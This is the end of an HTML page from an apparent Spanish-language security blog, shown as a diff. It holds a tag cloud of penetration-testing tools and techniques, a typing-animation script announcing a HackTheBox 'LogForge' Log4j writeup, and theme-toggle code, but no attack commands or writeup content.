href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada LOGFORGE que presenta la famosa Vuln Log4j';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
